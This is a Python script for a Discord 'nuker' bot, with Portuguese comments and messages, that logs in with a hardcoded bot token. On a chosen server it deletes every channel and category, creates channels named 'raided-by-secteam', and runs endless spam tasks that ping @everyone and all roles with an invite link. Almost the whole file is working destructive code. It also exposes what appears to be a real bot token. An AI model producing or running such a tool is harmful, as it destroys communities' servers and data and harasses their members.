import discord
from discord.ext import commands
from colorama import init, Fore, Style
import asyncio
import sys
import logging
import os
import random

init(autoreset=True)

logging.basicConfig(filename='bot.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logging.getLogger('discord').setLevel(logging.WARNING)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

TITULO_ASCII = """
 bot make by: dary"""

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

clear_screen()
print(Fore.RED + TITULO_ASCII)
print()

TOKEN = 'MTUwODIyNzI0MjYzMzk5MDE4NA.GAKbKT.R7aUF2EhL9CeuneHpFJgZR6USDifIj_fn2MuTk'         

try:
    GUILD_ID = int(input(Fore.WHITE + " ~ ID do servidor: " + Style.RESET_ALL).strip())
except ValueError:
    print(Fore.RED + "Erro: ID do servidor deve ser um número válido.")
    input(Fore.YELLOW + "Pressione Enter para sair...")
    sys.exit(1)

MENSAGENS_SPAM = [
    "@everyone Raided By 'Security Team https://discord.gg/secteam @here",
    "@everyone Raided By 'Security Team https://discord.gg/secteam @here",
    "@everyone Raided By 'Security Team https://discord.gg/secteam @here",
    "@everyone Raided By 'Security Team https://discord.gg/secteam @here",
    "@everyone Raided By 'Security Team https://discord.gg/secteam @here",
]

async def flood_insano(channel, roles_mention):
    mensagens = MENSAGENS_SPAM + [f"@everyone Raided By 'Security Team https://discord.gg/secteam @here"]

    while True:
        try:
            msg = random.choice(mensagens)
            await channel.send(msg, allowed_mentions=discord.AllowedMentions(everyone=True, roles=True))
        except discord.HTTPException:
            break

@bot.event
async def on_ready():
    clear_screen()
    print(Fore.GREEN + f'Bot logado como: {bot.user}')
    print(Fore.GREEN + f'Alvo: {GUILD_ID}')

    guild = bot.get_guild(GUILD_ID)
    if not guild:
        print(Fore.RED + "Erro: Bot não está no servidor ou ID errado.")
        await bot.close()
        return

    print(Fore.RED + "\n[!!!] NUKER TOTAL ATIVADO - DESTRUINDO TUDO [!!!]\n")

    # === PEGA TODAS AS ROLES PARA PINGAR ===
    roles_mention = " ".join([role.mention for role in guild.roles if role != guild.default_role])
    if not roles_mention:
        roles_mention = "@here"

    # === DELETAR ABSOLUTAMENTE TODOS OS CANAIS (INCLUINDO CATEGORIAS) ===
    print(Fore.RED + "[1] Deletando TODOS os canais, categorias, voz, estágios... TUDO!" + Style.RESET_ALL)
    
    delete_tasks = []
    for channel in guild.channels:
        # Agora deleta TUDO: texto, voz, categoria, estágio, fórum, anúncio...
        delete_tasks.append(channel.delete())
    
    if delete_tasks:
        results = await asyncio.gather(*delete_tasks, return_exceptions=True)
        deleted_count = sum(1 for r in results if not isinstance(r, Exception))
        print(Fore.RED + f"[+] {deleted_count} itens deletados (canais + categorias)!\n")
    else:
        print(Fore.YELLOW + "[!] Nenhum canal encontrado para deletar.\n")

    # === CRIAR 500 CANAIS + FLOOD INSANO ===
    print(Fore.MAGENTA + "[2] Criando 500 canais + FLOOD MÁXIMO COM PING EM TODAS AS ROLES..." + Style.RESET_ALL)

    flood_tasks = []
    create_tasks = []

    for i in range(50):
        create_tasks.append(guild.create_text_channel(f'raided-by-secteam'))

        if len(create_tasks) >= 15 or i == 499:
            try:
                new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
                create_tasks = []

                for channel in new_channels:
                    if isinstance(channel, discord.TextChannel):
                        print(Fore.CYAN + f"Flood INSANO → #{channel.name}")
                        for _ in range(5):
                            flood_tasks.append(asyncio.create_task(flood_insano(channel, roles_mention)))
            except Exception as e:
                print(Fore.RED + f"Erro no lote de criação: {e}")

    print(Fore.MAGENTA + f"\n[+] FLOOD INSANO ATIVO: ATÉ {len(flood_tasks)} TASKS DE SPAM!")
    print(Fore.MAGENTA + "[+] @everyone + @here + TODAS AS ROLES SENDO PINGADAS!")
    print(Fore.RED + "[!!!] SERVIDOR TOTALMENTE ANIQUILADO - NADA SOBROU [!!!]")

    # Bot continua online com spam eterno

try:
    bot.run(TOKEN)
except discord.LoginFailure:
    print(Fore.RED + "Token inválido ou bot banido.")
except Exception as e:
    print(Fore.RED + f"Erro: {e}")
finally:
    input(Fore.YELLOW + "\nPressione Enter para fechar...")